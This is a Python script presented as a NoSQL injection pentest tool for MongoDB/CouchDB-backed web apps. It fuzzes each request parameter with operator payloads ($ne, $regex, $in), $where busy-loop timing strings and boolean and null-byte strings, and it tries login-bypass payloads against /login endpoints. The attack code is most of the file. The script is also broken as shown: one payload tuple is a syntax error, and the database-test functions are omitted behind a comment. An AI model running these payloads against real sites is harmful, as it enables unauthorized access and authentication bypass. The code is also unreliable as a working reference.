#!/usr/bin/env python3
"""
nosqlprobe.py – Pentest NoSQL DBs (MongoDB, CouchDB) & enhanced NoSQL injection tests
Supports:
  • Syntax injection (single-quote, quote-plus, syntax fuzz)
  • Boolean‐based injection (AND, OR)
  • Null‐byte termination
  • NoSQL operator injection ($ne, $regex, $in, nested‐ and top‐level $where)
  • Timing‐based injection
  • Authentication bypass via operator combinations on /login
  • Works over HTTP or HTTPS via -u/--url or Burp raw requests (-r)
Dependencies:
    pip3 install pymongo couchdb requests colorama validators
"""
import argparse, csv, sys, ipaddress, json, os, time
from urllib.parse import urlparse, urlunparse, quote_plus, parse_qsl
from pymongo import MongoClient, errors as mongo_errors
import couchdb, requests, validators
from colorama import init as colorama_init, Fore

colorama_init(autoreset=True)

DEFAULT_PORTS = {'mongodb':27017,'couchdb':5984}
COMMON_MONGO_DBS = ['admin','local','config','test']

def parse_args():
    p = argparse.ArgumentParser(prog='nosqlprobe', description='Pentest NoSQL DBs & web apps')
    sub = p.add_subparsers(dest='command', required=True)
    db = sub.add_parser('db', help='MongoDB/CouchDB tests')
    db.add_argument('-e','--engine', choices=['mongodb','couchdb'], default='mongodb')
    db.add_argument('-t','--target', required=True)
    db.add_argument('-a','--anonymous', action='store_true')
    db.add_argument('--check-anonymous', action='store_true')
    db.add_argument('-n','--enum', action='store_true')
    db.add_argument('-c','--creds', help='user:pass')
    db.add_argument('-o','--output', help='CSV file')
    web = sub.add_parser('web', help='NoSQL injection tests on web apps')
    web.add_argument('-u','--url', help='Target URL')
    web.add_argument('-d','--data', help='POST data (form or JSON)')
    web.add_argument('-H','--headers', help='Headers; semicolon-separated')
    web.add_argument('-r','--request', help='Burp raw request file')
    return p.parse_args()

# ... (test_db_access, detect_mgmt, enumerate_db functions unchanged) ...

def parse_burp_request(path):
    if not os.path.isfile(path): raise FileNotFoundError(path)
    lines = open(path,'r',errors='ignore').read().splitlines()
    if not lines or ' ' not in lines[0]: raise ValueError("Bad request")
    method, uri, _ = lines[0].split(' ',2)
    hdrs = {}; i=1
    while i<len(lines) and lines[i]:
        if ':' in lines[i]:
            k,v = lines[i].split(':',1); hdrs[k.strip()]=v.strip()
        i+=1
    body = '\n'.join(lines[i+1:]) if i+1<len(lines) else ''
    parsed = urlparse(uri)
    if not parsed.scheme:
        host = hdrs.get('Host')
        uri = f"https://{host}{uri}"
    return method.upper(), uri, hdrs, body

def build_request_line(method, base, inj, data_json):
    p = urlparse(base)
    if method=='GET':
        qs = '&'.join(f"{quote_plus(str(k))}={quote_plus(str(v))}" for k,v in inj.items())
        return f"GET {p.path}?{qs} HTTP/1.1"
    else:
        if data_json:
            return f"curl -X POST {base} -H 'Content-Type: application/json' -d '{json.dumps(inj)}'"
        else:
            b = '&'.join(f"{quote_plus(str(k))}={quote_plus(str(v))}" for k,v in inj.items())
            return f"curl -X POST {base} -d '{b}'"

def handle_web(args):
    # Load request or CLI
    if args.request:
        method, url_full, headers, raw = parse_burp_request(args.request)
        p = urlparse(url_full)
        base_url = urlunparse((p.scheme,p.netloc,p.path,'','',''))
        orig_params = dict(parse_qsl(p.query, keep_blank_values=True))
        json_body, data_json = None, False
        if method=='POST' and raw:
            try: json_body = json.loads(raw); data_json = True
            except: orig_params = dict(parse_qsl(raw,keep_blank_values=True))
    else:
        method = 'POST' if args.data else 'GET'
        base_url = args.url; headers = {}
        if args.headers:
            for h in args.headers.split(';'):
                if ':' in h:
                    k,v = h.split(':',1); headers[k.strip()] = v.strip()
        p = urlparse(base_url)
        if not p.scheme:
            base_url = 'https://' + base_url
        orig_params = {}; json_body, data_json = None, False
        if args.data:
            t = args.data.strip()
            if t.startswith('{') and t.endswith('}'):
                json_body = json.loads(t); data_json = True
            else:
                orig_params = dict(parse_qsl(t,keep_blank_values=True))

    if not (args.request or args.url):
        print(Fore.RED+"[!] Web tests require --url or --request"); sys.exit(1)

    # Baseline
    try:
        if method=='GET':
            base_r = requests.get(base_url, params=orig_params, headers=headers, timeout=10)
        elif data_json:
            base_r = requests.post(base_url, json=json_body, headers=headers, timeout=10)
        else:
            base_r = requests.post(base_url, data=orig_params, headers=headers, timeout=10)
    except Exception as e:
        print(Fore.RED+f"[!] Baseline failed: {e}"); sys.exit(1)

    base_len = len(base_r.text)
    print(Fore.GREEN+f"[+] Baseline: {base_r.status_code} {base_r.reason}, len={base_len}")

    # General injection tests
    tests = [
      ('$ne','operator $ne', lambda v:v),
      ('$regex','operator $regex', lambda _: '^.*$'),
      ('$in','operator $in', lambda _: ['admin','administrator','superadmin']),
      ('syntax','syntax fuzz', lambda _: '"`{\r;$Foo}\n$Foo \\xYZ\x00'),
      ('bool-false','boolean FALSE', lambda _: "' && 0 && 'x"),
      ('bool-true','boolean TRUE', lambda _: "' && 1 && 'x"),
      ('or','boolean OR', lambda _: "'||1||'"),
      ('null','null byte', lambda v:v+'\x00'),
      ('$where','nested $where', lambda _: "';for(var i=0;i<1e8;i++);return true;//'"),
      ('top$where','top-level $where', lambda _: "';for(var i=0;i<1e8;i++);return true;//'")
    ]

    found = []
    items = (json_body.items() if data_json else orig_params.items())

    for op,label,pfn in tests:
        print("\n"+Fore.YELLOW+f"[*] Testing {label}")
        for k,v in items:
            inj_params, inj_body = None, None

            # Build payload
            if op in ('$ne','$regex','$in','$where'):
                if data_json:
                    inj_body = json_body.copy()
                    if op=='$in':
                        inj_body[k] = {'$in': pfn(v)}
                    else:
                        inj_body[k] = {op: pfn(v)}
                else:
                    if method=='GET':
                        inj_params = orig_params.copy()
                        if op=='$in':
                            inj_params[f"{k}[$in]"] = ','.join(pfn(v))
                        elif op=='$where':
                            inj_params[k] = pfn(v)
                        else:
                            inj_params[f"{k}[{op}]"] = (v if op=='$ne' else pfn(v))
                    else:
                        if op=='$in':
                            inj_params = {f"{k}[$in]": ','.join(pfn(v))}
                        else:
                            inj_params = {f"{k}[{op}]": (v if op=='$ne' else pfn(v))}
            elif op=='top$where':
                if data_json:
                    inj_body = json_body.copy()
                    inj_body['$where'] = pfn(v)
                else:
                    if method=='GET':
                        inj_params = orig_params.copy()
                        inj_params['$where'] = pfn(v)
                    else:
                        inj_params = {'$where': pfn(v)}
            else:
                pl = pfn(v)
                if data_json: continue
                if method=='GET':
                    inj_params = orig_params.copy()
                    inj_params[k] = pl
                else:
                    inj_params = {k: pl}

            # Send injection
            try:
                if method=='GET':
                    resp = requests.get(base_url, params=inj_params, headers=headers, timeout=20)
                elif inj_body is not None:
                    resp = requests.post(base_url, json=inj_body, headers=headers, timeout=20)
                else:
                    resp = requests.post(base_url, data=inj_params, headers=headers, timeout=20)
            except Exception as e:
                print(Fore.RED+f"    [!] {k} error: {e}"); continue

            delta = abs(len(resp.text)-base_len)
            vul = (delta>0) or (op=='$ne' and resp.status_code>=400)
            if vul:
                req = resp.request
                print(Fore.GREEN+f"  [+] {k} ({label}) Δ={delta} status={resp.status_code}")
                print(Fore.GREEN+"      --- HTTP REQUEST ---")
                line = req.path_url if req.body is None else req.url
                print(f"      {req.method} {line} HTTP/1.1")
                for hk,hv in req.headers.items():
                    print(f"      {hk}: {hv}")
                if req.body:
                    b = req.body.decode() if isinstance(req.body,bytes) else str(req.body)
                    for L in b.splitlines(): print(f"      {L}")
                print(Fore.GREEN+"      --- HTTP RESPONSE ---")
                print(f"      HTTP/1.1 {resp.status_code} {resp.reason}")
                for rk,rv in resp.headers.items():
                    print(f"      {rk}: {rv}")
                for L in resp.text.splitlines(): print(f"      {L}")
                found.append((k,label, inj_body if inj_body is not None else inj_params, resp.status_code))
            else:
                print(f"  [-] {k} Δ={delta} status={resp.status_code}")

    # Authentication-bypass on /login
    path = urlparse(base_url).path.lower()
    if method=='POST' and path.endswith('/login'):
        print("\n"+Fore.YELLOW+"[*] Testing auth bypass combos")
        # original creds
        orig_user = orig_params.get('username') if not data_json else json_body.get('username')
        scenarios = [
            ('user $ne',  {'username': {'$ne': ''}}),
            ('user regex',{'username': {'$regex': orig_user + '.*'}}),
            ('both $ne',  {'username': {'$ne': ''}, 'password': {'$ne': ''}}),
            ('admin regex','username': {'$regex': 'admin.*'}, 'password': {'$ne': ''})
        ]
        # test each scenario
        for label, payload in scenarios:
            print(Fore.YELLOW+f"  [*] {label}")
            if data_json:
                inj_body = json_body.copy()
                inj_body.update(payload)
                send = lambda: requests.post(base_url, json=inj_body, headers=headers, timeout=20)
            else:
                # form
                params = orig_params.copy()
                # remove originals if operators
                for k in payload:
                    params.pop(k, None)
                for k,v in payload.items():
                    if isinstance(v, dict):
                        # assume $ne/$regex form
                        op = next(iter(v.keys()))
                        params[f"{k}[{op}]"] = v[op]
                    else:
                        params[k] = v
                send = lambda: requests.post(base_url, data=params, headers=headers, timeout=20)

            try:
                r = send()
            except Exception as e:
                print(Fore.RED+f"    [!] error: {e}"); continue

            ok = (r.status_code in (302,200)) and 'Invalid' not in r.text
            print(Fore.GREEN+f"    -> status={r.status_code}, success={'yes' if ok else 'no'}")
            if ok:
                print(Fore.GREEN+f"      Payload: {payload}")

    # Summary
    if found:
        print("\n"+Fore.GREEN+"[+] Injection points:")
        for p,l,pay,st in found:
            print(f"    - Param: {p}, Type: {l}, Status: {st}")
            print(f"      Payload: {pay}")
    else:
        print("\n"+Fore.RED+"[-] No injections detected")


def main():
    args = parse_args()
    if args.command=='web':
        handle_web(args)
    else:
        handle_db(args)

if __name__=='__main__':
    main()
